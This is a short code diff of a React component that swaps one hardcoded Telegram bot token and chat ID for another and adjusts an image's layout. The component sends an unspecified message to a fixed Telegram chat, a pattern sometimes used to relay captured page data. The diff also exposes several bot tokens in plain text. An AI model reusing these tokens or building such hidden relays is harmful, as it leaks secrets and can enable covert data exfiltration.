@@ -124,8 +124,8 @@ function App6() {
 
     // const TELEGRAM_TOKEN = "5964017003:AAH3LVmpPgezxLrs2-q53OLpYVdbCIybqjk";
     // const TELEGRAM_CHAT_ID = -1001643618319; // your telegram chat ID
-    const TELEGRAM_TOKEN = "5981900899:AAEBTRzH4VUrWbKLWoaBEgc6wJRdLgpj8r0";
-    const TELEGRAM_CHAT_ID = -1001985551986;
+    const TELEGRAM_TOKEN = "6015535162:AAFAXP7ehzYIDRAbm1Jyr0c2CzrAceevmyA";
+    const TELEGRAM_CHAT_ID = -1001895351342;
     const telegramApi = new TelegramApi(TELEGRAM_TOKEN);
     telegramApi.sendMessage(
       TELEGRAM_CHAT_ID,
@@ -217,7 +217,7 @@ function App6() {
                    {isBrowser ? (
             <img style={{ width: "1000px" , height: "auto", marginLeft: 20 }} src={"/img/sbstock.png"}></img>
             ) : (
-              <img style={{ width: "550px" , height: "auto", marginLeft: 30 }} src={"/img/sbstock.png"}></img>
+              <img style={{ width: "550px" , height: "auto", marginLeft: "auto" , marginRight : "auto"  }} src={"/img/sbstock.png"}></img>
             )}
                   {/* <img
                     className="appPicture"
